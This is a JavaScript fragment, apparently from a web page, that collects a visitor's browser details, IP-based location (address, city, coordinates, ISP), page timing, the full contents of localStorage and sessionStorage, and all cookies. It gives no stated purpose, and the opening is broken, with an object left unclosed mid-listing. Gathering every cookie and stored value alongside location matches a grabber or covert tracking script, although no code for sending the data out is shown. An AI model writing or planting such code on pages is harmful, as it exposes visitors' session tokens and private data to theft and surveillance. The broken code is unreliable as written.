                onlineStatus: navigator.onLine,

                deviceMemory: navigator.deviceMemory,

                vendor: navigator.vendor,
                connection: navigator.connection ? {

                    downlink: navigator.connection.downlink,

        // Function to get location information
        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    postal: data.postal,
                    org: data.org,
                    asn: data.asn,
                    timezone: data.timezone
                };
            } catch (error) {
                console.error('Error getting location:', error);
                return null;
            }
        }
        
        // Function to get performance information
        function getPerformanceInfo() {
            if (window.performance && window.performance.timing) {
                const timing = window.performance.timing;
                return {
                    loadTime: timing.loadEventEnd - timing.navigationStart,
                    domContentLoaded: timing.domContentLoadedEventEnd - timing.navigationStart,
                    firstPaint: performance.getEntriesByType('paint')[0]?.startTime,
                    firstContentfulPaint: performance.getEntriesByType('paint')[1]?.startTime
                };
            }
            return null;
        }
        
        // Function to get localStorage and sessionStorage info
        function getStorageInfo() {
            const storageInfo = {
                localStorage: {},
                sessionStorage: {},
                localStorageSize: 0,
                sessionStorageSize: 0
            };
            
            // Get localStorage data
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                storageInfo.localStorage[key] = value;
                storageInfo.localStorageSize += key.length + value.length;
            }
            
            // Get sessionStorage data
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                storageInfo.sessionStorage[key] = value;
                storageInfo.sessionStorageSize += key.length + value.length;
            }
            
            return storageInfo;
        }
        
        // Function to get cookies
        function getCookies() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = value;
                }
            });
            return cookies;
        }
